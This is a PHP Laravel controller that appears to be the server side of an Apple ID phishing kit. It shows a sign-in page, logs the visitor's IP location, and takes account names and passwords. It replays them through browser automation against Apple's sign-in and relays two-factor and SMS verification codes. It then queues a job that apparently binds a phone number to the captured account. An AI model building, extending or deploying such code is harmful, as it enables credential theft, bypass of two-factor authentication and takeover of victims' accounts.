<?php

namespace App\Http\Controllers;

use App\Apple\Service\Apple;
use App\Apple\Service\AppleFactory;
use App\Apple\Service\ConnectorService;
use App\Apple\Service\Exception\UnauthorizedException;
use App\Apple\Service\Exception\VerificationCodeIncorrect;
use App\Apple\Service\PhoneNumber\PhoneNumberFactory;
use App\Apple\Service\User\UserFactory;
use App\Http\Requests\VerifyAccountRequest;
use App\Http\Requests\VerifyCodeRequest;
use App\Jobs\BindAccountPhone;
use App\Models\Account;
use App\Models\SecuritySetting;
use App\Selenium\AppleClient\Exception\AccountException;
use App\Selenium\AppleClient\Page\SignIn\SignInSelectPhonePage;
use App\Selenium\AppleClient\Page\SignIn\TwoFactorAuthWithDevicePage;
use App\Selenium\ConnectorManager;
use App\Selenium\Exception\PageErrorException;
use App\Selenium\Exception\PageException;
use Facebook\WebDriver\Exception\NoSuchElementException;
use Facebook\WebDriver\Exception\TimeoutException;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Foundation\Application;
use Illuminate\Http\Client\ConnectionException;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Routing\Redirector;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Validator;
use Illuminate\Validation\ValidationException;
use libphonenumber\NumberParseException;
use libphonenumber\PhoneNumberFormat;
use Saloon\Exceptions\SaloonException;
use Weijiajia\IpConnector;
use Weijiajia\Requests\PconLineRequest;
use Weijiajia\Responses\IpResponse;

class IndexController extends Controller
{


    public function __construct(
        protected readonly Request $request,
        private readonly AppleFactory $appleFactory,
        private readonly PhoneNumberFactory $phoneNumberFactory,
        protected UserFactory $userFactory,
        protected ConnectorManager $connectorManager,
        protected ConnectorService $connectorService,
    )
    {

    }

    protected function getAccount(): ?Account
    {
        return $this->request->user();
    }

    protected function getApple():?Apple
    {
        return $this->request->attributes->get('apple');
    }

    public function ip():string
    {
        return $this->request->ip();
    }

    public function index(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/index');
    }

    public function signin(): Response
    {
        $guid = sha1(microtime());

        $IpConnector = new IpConnector();
        $apple = $this->appleFactory->create($guid);

        try {

            $response = $IpConnector->send(new PconLineRequest(ip: $this->request->ip()));

            /**
             * @var IpResponse $ipaddress
             */
            $ipaddress = $response->dto();

            $apple->getUser()->add('ipaddress',$ipaddress);

            Log::info('获取IP地址成功',['ipaddress' => $ipaddress->all()]);
        } catch (SaloonException $e) {

        }

        return response()
            ->view('index/signin')
            ->withCookie(Cookie::make('Guid', $guid,10));
    }

    protected function getCountryCode():?string
    {
        return SecuritySetting::first()?->configuration['country_code'] ?? null;
    }

    protected function formatPhone(string $phone): string
    {
        if (empty($countryCode = $this->getCountryCode())) {
            return $phone;
        }

        try {

            return $this->phoneNumberFactory->createPhoneNumberService(
                $phone,
                $countryCode,
                PhoneNumberFormat::INTERNATIONAL
            )->format();

        } catch (NumberParseException $e) {
            return $phone;
        }
    }

    /**
     * @param VerifyAccountRequest $request
     * @return JsonResponse
     * @throws AccountException
     * @throws NoSuchElementException
     * @throws PageException
     * @throws TimeoutException
     * @throws PageErrorException
     */
    public function verifyAccount(VerifyAccountRequest $request): JsonResponse
    {
        $validatedData = $request->validated();

        // 获取 accountName
        $accountName = $validatedData['accountName'];

        // 获取 password
        $password = $validatedData['password'];

        $validator = Validator::make(['email' => $accountName], [
            'email' => 'email',
        ]);

        // 不是有效的邮箱,那就是手机号
        if ($validator->fails()) {
            $accountName = $this->formatPhone($accountName);
        }

        $authPage = $this->connectorService->verifyAccount($accountName, $password);

        return match (true) {
            $authPage instanceof SignInSelectPhonePage => $this->success(data: ['Devices' => false], code: 202),
            $authPage instanceof TwoFactorAuthWithDevicePage => $this->success(data: ['Devices' => true], code: 201),
            default => $this->success(data: ['Devices' => true], code: 203),
        };
    }

    public function auth(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/auth');
    }

    /**
     * @return View
     * @throws NoSuchElementException
     * @throws TimeoutException
     */
    public function authPhoneList(): View
    {
        return view('index.auth-phone-list',['trustedPhoneNumbers' => $this->connectorService->getPhoneLists()]);
    }

    /**
     * 验证安全码
     * @param VerifyCodeRequest $request
     * @return JsonResponse
     * @throws VerificationCodeIncorrect|PageException
     */
    public function verifySecurityCode(VerifyCodeRequest $request): JsonResponse
    {
        $validated = $request->validated();

        $this->connectorService->smsSecurityCode($validated['apple_verifycode']);

        BindAccountPhone::dispatch($this->connectorService->getGuid(),$this->connectorService->getUser()->getAccount())->delay(now()->addSeconds(10));

        return $this->success([]);
    }


    /**
     * 验证手机验证码
     * @param VerifyCodeRequest $request
     * @return JsonResponse
     * @throws UnauthorizedException
     * @throws VerificationCodeIncorrect
     * @throws ConnectionException
     */
    public function smsSecurityCode(VerifyCodeRequest $request): JsonResponse
    {
        $validated = $request->validated();

        $this->connectorService->smsSecurityCode($validated['apple_verifycode']);

        BindAccountPhone::dispatch($this->connectorService->getGuid(),$this->connectorService->getUser()->getAccount())->delay(now()->addSeconds(10));

        return $this->success();
    }

    /**
     * 获取安全码
     * @return JsonResponse
     * @throws NoSuchElementException
     */
    public function SendSecurityCode(): JsonResponse
    {
        $this->connectorService->resendSecurityCode();

        sleep(3);

        return $this->success();
    }

    /**
     * @return JsonResponse
     * @throws NoSuchElementException
     */
    public function resendCode(): JsonResponse
    {
        $this->connectorService->resendPhoneCode();

        sleep(3);

        return $this->success();
    }

    /**
     * 获取手机号码
     * @return JsonResponse
     */
    public function GetPhone(): JsonResponse
    {
        $authPage = $this->connectorService->usePhoneNumber();

        return match(true){
            $authPage instanceof SignInSelectPhonePage => $this->success(data: ['Devices' => false,],code: 202),
            default => $this->success(data: ['Devices' => true,],code: 203)
        };
    }

    /**
     * 发送验证码
     * @return JsonResponse|Redirector
     * @throws NoSuchElementException
     * @throws TimeoutException
     * @throws ValidationException
     */
    public function SendSms(): JsonResponse|Redirector
    {
        $params = Validator::make($this->request->all(), [
            'ID' => 'required|integer|min:0',
        ])->validated();


        try {

           $this->connectorService->sendSms($params['ID']);

        } catch (PageException $e) {

            return $this->error($e->getMessage() ?: "Too many verification codes have been sent. Enter the last code you received, use one of your devices, or try again later.",400);
        }

        return $this->success();
    }

    public function sms(): View|Factory|Application
    {
        return view('index/sms',[
            'phoneNumber' => $this->request->input('Number'),
            'useDifferentPhoneNumber' => $this->connectorService->getUseDifferentPhoneNumberButton(),
        ]);
    }

    public function useDifferentPhoneNumber(): JsonResponse
    {
        $this->connectorService->useDifferentPhoneNumber();

        return $this->success();
    }

    public function result(): View|Factory|Application
    {
        return view('index/result');
    }
}
